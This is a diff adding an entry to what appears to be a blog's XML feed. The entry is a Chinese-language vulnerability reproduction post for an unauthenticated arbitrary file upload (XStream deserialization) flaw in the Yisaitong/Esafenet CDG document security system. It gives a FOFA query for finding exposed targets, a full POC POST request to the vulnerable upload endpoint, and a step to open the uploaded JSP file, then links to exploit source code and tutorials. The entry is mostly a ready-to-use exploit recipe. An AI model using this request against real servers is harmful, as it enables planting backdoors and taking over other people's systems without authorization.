@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用</title>
+    <link href="/2024/09/29/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FXStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/"/>
+    <url>/2024/09/29/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FXStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/</url>
+    
+    <content type="html"><![CDATA[<p>一、产品简介<br>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。<br>二、漏洞描述<br>亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。<br>三、影响范围<br>未知<br>四、复现环境<br>FOFA：app&#x3D;“亿赛通-电子文档安全管理系统”<br>五、漏洞复现<br>1.访问存在漏洞网站，抓包<br>2.POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs angular2html">POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1<br>Host: IP：port<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Sec-Fetch-Dest: document<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-Site: none<br>Sec-Fetch-User: ?1<br>Upgrade-Insecure-Requests: 1<br><br><br>上传的文件内容<br></code></pre></td></tr></table></figure><p>3.测试，上传成功<br>4.访问ip:port&#x2F;tttT.jsp</p><p>利用源码：<a href="https://github.com/candyadmin/CDGXStreamDeserRCE">https://github.com/candyadmin/CDGXStreamDeserRCE</a><br>教程：<br><a href="https://www.yuque.com/u34516370/hi2ux9/nibcqge2832vptra">https://www.yuque.com/u34516370/hi2ux9/nibcqge2832vptra</a><br><a href="https://blog.csdn.net/uuzeray/article/details/136690493">https://blog.csdn.net/uuzeray/article/details/136690493</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>spring_state_machine</title>
     <link href="/2024/09/19/spring-state-machine/"/>
     <url>/2024/09/19/spring-state-machine/</url>
